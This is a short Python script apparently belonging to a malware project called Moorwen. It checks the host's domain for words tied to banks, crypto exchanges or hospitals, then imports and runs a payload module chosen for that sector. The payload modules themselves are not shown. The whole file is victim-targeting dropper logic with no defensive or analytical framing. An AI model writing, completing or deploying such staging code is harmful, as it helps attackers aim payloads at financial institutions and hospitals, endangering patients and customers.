# ============================================================
# MOORWEN — ENVIRONMENT DETECTOR
# ============================================================

import socket
import requests
import re

def detect_environment():
    # Check network domain
    try:
        hostname = socket.gethostname()
        domain = socket.getfqdn()
        if "bank" in domain or "finance" in domain:
            return "financial"
        elif "exchange" in domain or "crypto" in domain:
            return "crypto"
        elif "hospital" in domain or "health" in domain:
            return "hospital"
    except:
        pass

    # Check system fingerprint (simulated)
    # In production, you'd check registry, processes, etc.
    return "unknown"

def deploy_payload(env):
    if env == "financial":
        import banking_payload
        banking_payload.run()
    elif env == "crypto":
        import crypto_payload
        crypto_payload.run()
    elif env == "hospital":
        import hospital_payload
        hospital_payload.run()
    else:
        # Fallback to general payload
        import general_payload
        general_payload.run()

if __name__ == "__main__":
    env = detect_environment()
    print(f"[*] Environment detected: {env}")
    deploy_payload(env)
